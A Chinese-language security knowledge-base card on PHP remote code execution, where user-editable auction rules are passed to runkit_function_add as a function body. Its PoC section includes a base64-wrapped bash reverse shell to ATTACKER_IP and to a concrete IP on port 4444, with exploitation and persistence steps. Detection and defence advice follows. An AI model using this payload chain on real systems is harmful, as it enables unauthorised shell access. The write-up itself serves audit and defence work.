---
id: web-php-rce-runkit-function-add-rule-body
title: runkit_function_add 动态函数体注入：用户可控 rule 被编译为 PHP 函数体执行
type: scenario
domain: web
path: web/php/rce
technique: runkit-function-add-code-injection
tags:
- php
- rce
- code-injection
- runkit
- dynamic-function
- eval-equivalent
- rule-engine
- stored-code-injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V182
  verified_at: '2026-11-06T19:54:32+08:00'
  notes: 已对照原文核对（含12张图片）；PoC 未实际执行；runkit_function_add 第三参数为代码体与文中调用链一致
url: /docs/web/php/rce/web-php-rce-runkit-function-add-rule-body/
draft: false
kb_aliases:
- runkit_function_add RCE
- runkit 动态函数注入
- ruleCheck 代码注入
- 规则引擎代码执行
- 竞拍 rule 参数 RCE
---

## 一句话结论

`runkit_function_add($name, $args, $code)` 的第三个参数是会被 Zend 编译执行的 PHP 代码；当应用把用户可编辑的 `$rule` 直接作为函数体传入、并立即调用该函数时，任何能编辑规则的人都能获得 PHP 代码执行，效果等同于 `eval($rule)`。

## 原理

- **runkit 的运行时函数创建**：runkit/runkit7 扩展允许在运行时创建、删除、重定义函数。`runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule)` 会用 `$arglist` 作为形参列表、`$rule` 作为函数体，动态编译出一个名为 `ruleCheck` 的函数。
- **函数体不是数据而是代码**：第三个参数进入 PHP 编译器后被当作语句序列执行；函数内可以调用任意内置函数、读写文件、发起网络连接。它没有“沙箱”或“表达式求值”边界，安全语义与 `eval()` 相同。
- **调用紧随其后**：示例代码在创建函数后立即执行 `$allowed = ruleCheck($current_bid, $previous_bid, $bidder);`，因此规则被保存/提交后不需要额外触发点，竞价流程走到这里就会执行。
- **输入来源**：`$rule` 来自后台的“Edit rule”字段（拍卖品规则），属于存储型、二阶代码注入：编辑时只是写入存储，真正执行发生在下一次竞价处理时。
- **权限链**：案例中先通过 SQL 注入拿到 `users` 表的 bcrypt 哈希，破解出 `auctioneer` 的密码并登录后台，才有编辑规则的权限；这说明漏洞本身需要“能控制 rule”的前置权限，但一旦满足即形成完整 RCE。
- **附带信息泄露**：代码里的 `error_log("Rule: " . $rule);` 会把攻击者的 PHP 代码原样写进错误日志，既便于溯源，也可能造成日志注入。

## 触发条件

- 目标 PHP 安装了 runkit 或 runkit7 扩展，且 `runkit_function_add` 未被禁用。
- 应用存在“规则/表达式/脚本”类配置字段，其值被直接作为 `runkit_function_add` 的 `$code` 参数。
- 攻击者能编辑该字段（案例为 auctioneer/admin 后台权限），并能触发调用该规则的业务动作（案例为对拍卖品出价）。
- 规则字段没有白名单、语法解析或沙箱，只有长度/格式校验也无法阻止代码执行。
- Web 进程权限下有可用的命令执行函数（案例中 `system` 可用）或文件写入/网络函数。

## 利用步骤

1. 获取可编辑规则的高权限账户；案例通过 SQL 注入导出 `users` 表，破解 `auctioneer` 的 bcrypt 哈希后登录。
2. 打开 Admin Panel，对某个拍卖品点击“Edit rule”，把规则内容改为 PHP 代码，例如 `return system("...");`。
3. 保存规则；应用会把它存入拍卖品配置，等待 `bid_handler.php` 调用 `ruleCheck`。
4. 进入 Bidding 页面对该拍卖品出价，触发 `runkit_function_add` 创建函数并立即调用，代码执行。
5. 在攻击机监听反弹 Shell；收到 Web 用户（案例为 `www-data`）的 shell。
6. 若规则保存与执行分离，可重复编辑并在任意用户出价时触发；也可把命令改为写文件/加 SSH key 等持久化动作。

## PoC

规则字段最小载荷（`system` 执行 base64 解码后的命令，避免引号/空格被过滤）：

```php
return system("echo BASE64_PAYLOAD | base64 -d | bash");
```

其中 `BASE64_PAYLOAD` 为反弹 Shell 命令的 base64，例如：

```bash
echo -n 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64
```

案例使用的完整规则：

```php
return system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42OS80NDQ0IDA+JjE= | base64 -d |bash");
```

`return` 用于给 `ruleCheck` 一个返回值（调用方把结果赋给 `$allowed` 并做布尔判断）；命令执行发生在 `system()` 调用时，返回值不影响代码已经执行。

## 变体与关联

- **同一扩展的重定义接口**：`runkit_function_redefine`、`runkit_method_add/redefine` 也接受代码字符串，风险相同。
- **其他动态代码汇点**：`create_function`（旧版本）、`eval`、`assert` 的字符串模式、`preg_replace` 的 `/e` 修饰符、`call_user_func` 传入用户可控函数名；代码审计时应把“用户输入 → 代码字符串 → 编译执行”作为一条污点链追。
- **规则引擎误用**：很多拍卖/风控/促销系统把“规则”做成 PHP 片段存入数据库，再在业务请求中 eval；本卡是这类设计的典型实现（runkit 版本）。
- **关联：后台到 RCE**。`web/php/rce` 下已有大量“后台配置字段 → 代码执行”的案例；本卡的新增点是 runkit 这一运行时函数创建接口，而不是常见的 `eval`/`assert`。
- **关联：SQL 注入到账户接管**。案例的入口是 PDO 模拟预编译注入读取 `users` 表并破解 bcrypt，属于完整的“注入 → 凭据 → 后台 → RCE”链路。

## 检测与防御

- **移除危险扩展**：生产环境不安装 runkit/runkit7；如必须使用，至少把 `runkit_function_add`、`runkit_function_redefine` 加入 `disable_functions`（注意 disable_functions 并非不可绕过，应作为纵深防御）。
- **禁止把用户输入当代码**：规则引擎改为声明式 DSL（字段、比较符、阈值、动作枚举），由解释器消费数据结构，不生成/编译 PHP 代码。
- **代码审计特征**：搜索 `runkit_function_add(`、`runkit_function_redefine(`、`eval(`、`create_function(`，并回溯第三个参数/代码参数是否可达请求参数、数据库配置或后台表单。
- **权限与隔离**：后台规则编辑仅限必要角色并强制强口令/MFA；Web 进程使用低权限用户，禁用不必要的 `system/exec/shell_exec/proc_open`。
- **检测**：监控 `error_log` 中 `Rule:` 后出现 `system`、`exec`、`base64`、`/dev/tcp` 等特征；审计后台“编辑规则”请求的异常内容；关注 Web 进程产生的 `bash`/`sh` 子进程与出站连接。
- **应急**：发现规则字段被写入 PHP 代码时，检查是否已创建计划任务、SSH key、WebShell 或 SUID 文件，并轮换数据库与后台账户口令。
